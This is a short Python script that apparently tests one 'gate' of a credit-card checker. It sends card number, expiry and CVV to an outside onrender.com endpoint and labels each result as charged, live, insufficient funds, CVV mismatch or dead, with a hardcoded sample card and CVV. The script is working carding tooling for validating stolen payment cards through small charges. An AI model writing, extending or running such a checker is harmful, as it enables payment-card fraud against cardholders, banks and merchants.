
import asyncio
import aiohttp

# Copied from gates.py to test in isolation
async def check_paypal_render(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """PayPal Render API Gate"""
    url = f"https://paypal0-1.onrender.com/gate=pp1/cc={card}|{month}|{year}|{cvv}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=60) as resp:
                try:
                    res_json = await resp.json()
                except:
                    text = await resp.text()
                    return {"status": "error", "response": text[:100], "gate": "PayPal Render"}
                
                status = res_json.get("status", "").lower()
                msg = res_json.get("message", "")
                code = res_json.get("code", "")
                
                if status in ["charged", "success", "succeeded"]:
                    return {"status": "charged", "amount": "$0.50", "response": "$0.50 Charged 🔥", "gate": "PayPal Render"}
                
                if status == "approved":
                    return {"status": "live", "response": "Approved (Auth) ✅", "gate": "PayPal Render"}
                
                if "insufficient" in msg.lower() or "insufficient" in code.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "PayPal Render"}
                
                if "security code" in msg.lower() or "cvv" in msg.lower() or "cvc" in msg.lower():
                     return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "PayPal Render"}

                return {"status": "dead", "response": f"{msg} {code}".strip() or "Declined", "gate": "PayPal Render"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "PayPal Render"}

async def main():
    print("Testing PayPal Render Gate (Standalone)...")
    
    # Test Card (Random Dead One)
    card = "4763335084660298"
    month = "11"
    year = "30"
    cvv = "895"
    
    print(f"Checking {card}...")
    result = await check_paypal_render(card, month, year, cvv)
    print("Result:", result)

if __name__ == "__main__":
    asyncio.run(main())
